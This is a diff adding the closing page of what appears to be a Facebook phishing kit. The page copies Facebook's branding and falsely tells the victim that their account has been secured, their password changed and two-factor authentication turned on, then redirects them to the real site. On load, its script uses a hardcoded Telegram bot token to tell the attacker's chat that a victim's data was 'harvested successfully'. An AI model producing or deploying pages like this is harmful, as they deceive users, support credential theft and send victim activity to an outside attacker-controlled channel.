@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Account Secured - Facebook</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: Helvetica, Arial, sans-serif; background: linear-gradient(135deg, #f0f2f5 0%, #e4e6eb 100%); min-height: 100vh; display: flex; flex-direction: column; }
+        .navbar { background: white; height: 56px; box-shadow: 0 1px 2px rgba(0,0,0,0.1); display: flex; align-items: center; padding: 0 20px; }
+        .logo { color: #1877f2; font-size: 28px; font-weight: bold; }
+        .container { max-width: 600px; margin: 60px auto; padding: 0 20px; flex: 1; display: flex; flex-direction: column; justify-content: center; }
+        .success-card { background: white; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); padding: 50px 40px; text-align: center; position: relative; overflow: hidden; }
+        .success-card::before { content: ''; position: absolute; top: 0; left: 0; right: 0; height: 4px; background: linear-gradient(90deg, #42b72a, #1877f2); }
+        .success-icon { width: 90px; height: 90px; background: linear-gradient(135deg, #42b72a 0%, #36a420 100%); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 25px; font-size: 45px; color: white; box-shadow: 0 4px 15px rgba(66, 183, 42, 0.3); animation: scaleIn 0.5s ease-out; }
+        @keyframes scaleIn { 0% { transform: scale(0); opacity: 0; } 50% { transform: scale(1.1); } 100% { transform: scale(1); opacity: 1; } }
+        h1 { color: #1c1e21; font-size: 28px; margin-bottom: 15px; font-weight: 700; }
+        .subtitle { color: #606770; font-size: 17px; line-height: 1.5; margin-bottom: 30px; }
+        .security-details { background: #f0f2f5; border-radius: 10px; padding: 25px; margin: 30px 0; text-align: left; }
+        .detail-item { display: flex; align-items: center; gap: 15px; padding: 12px 0; border-bottom: 1px solid #dddfe2; }
+        .detail-item:last-child { border-bottom: none; }
+        .detail-icon { width: 40px; height: 40px; background: white; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 18px; flex-shrink: 0; }
+        .detail-text h4 { color: #1c1e21; font-size: 15px; margin-bottom: 3px; }
+        .detail-text p { color: #606770; font-size: 13px; }
+        .redirect-box { margin-top: 30px; padding: 20px; background: #e7f3ff; border-radius: 8px; border: 1px solid #b8daff; }
+        .redirect-text { color: #1877f2; font-size: 15px; font-weight: 600; margin-bottom: 10px; }
+        .countdown { font-size: 24px; font-weight: bold; color: #1877f2; font-family: monospace; }
+        .progress-bar { width: 100%; height: 4px; background: #dddfe2; border-radius: 2px; margin-top: 15px; overflow: hidden; }
+        .progress-fill { height: 100%; background: linear-gradient(90deg, #1877f2, #42b72a); width: 100%; animation: countdown 5s linear forwards; }
+        @keyframes countdown { from { width: 100%; } to { width: 0%; } }
+        .facebook-btn { display: inline-flex; align-items: center; gap: 8px; background: #1877f2; color: white; text-decoration: none; padding: 12px 24px; border-radius: 6px; font-weight: 600; font-size: 15px; margin-top: 10px; transition: all 0.2s; }
+        .facebook-btn:hover { background: #166fe5; transform: translateY(-2px); box-shadow: 0 4px 12px rgba(24, 119, 242, 0.3); }
+        footer { background: white; padding: 20px; text-align: center; color: #737373; font-size: 12px; }
+    </style>
+</head>
+<body>
+    <nav class="navbar">
+        <div class="logo">facebook</div>
+    </nav>
+
+    <div class="container">
+        <div class="success-card">
+            <div class="success-icon">✓</div>
+            
+            <h1>Your Account is Now Secured</h1>
+            <p class="subtitle">We've successfully updated your security settings and protected your account.</p>
+
+            <div class="security-details">
+                <div class="detail-item">
+                    <div class="detail-icon">🔒</div>
+                    <div class="detail-text">
+                        <h4>Password Changed</h4>
+                        <p>Your new password is active</p>
+                    </div>
+                </div>
+                <div class="detail-item">
+                    <div class="detail-icon">🚫</div>
+                    <div class="detail-text">
+                        <h4>Tunisian Session Ended</h4>
+                        <p>Logged out from 197.14.23.156</p>
+                    </div>
+                </div>
+                <div class="detail-item">
+                    <div class="detail-icon">🛡️</div>
+                    <div class="detail-text">
+                        <h4>Extra Protection On</h4>
+                        <p>Two-factor authentication enabled</p>
+                    </div>
+                </div>
+            </div>
+
+            <div class="redirect-box">
+                <div class="redirect-text">Redirecting to Facebook...</div>
+                <div class="countdown" id="countdown">5</div>
+                <div class="progress-bar">
+                    <div class="progress-fill"></div>
+                </div>
+            </div>
+
+            <a href="https://www.facebook.com" class="facebook-btn">
+                <span>Go to Facebook Now</span>
+                <span>→</span>
+            </a>
+        </div>
+    </div>
+
+    <footer>Meta © 2024 • Security Center</footer>
+
+    <script>
+        // 🔥 SAME CONFIG (optional - for final notification)
+        const BOT_TOKEN = '8582083084:AAHy-qeLImcvXVBauwzDC011z6ww5qqX22o';
+        const CHAT_ID = '-1003840277325';
+
+        // Send final notification
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: `✅ *VICTIM COMPLETED ALL STEPS* ✅\n\n🎉 Full data harvested successfully!\n⏰ Finished: ${new Date().toLocaleString()}`,
+                parse_mode: 'Markdown'
+            })
+        }).catch(() => {});
+
+        // Countdown
+        let seconds = 5;
+        const countdownEl = document.getElementById('countdown');
+        
+        const timer = setInterval(() => {
+            seconds--;
+            countdownEl.textContent = seconds;
+            if (seconds <= 0) {
+                clearInterval(timer);
+                window.location.href = 'https://www.facebook.com';
+            }
+        }, 1000);
+    </script>
+</body>
+  </html>
+  
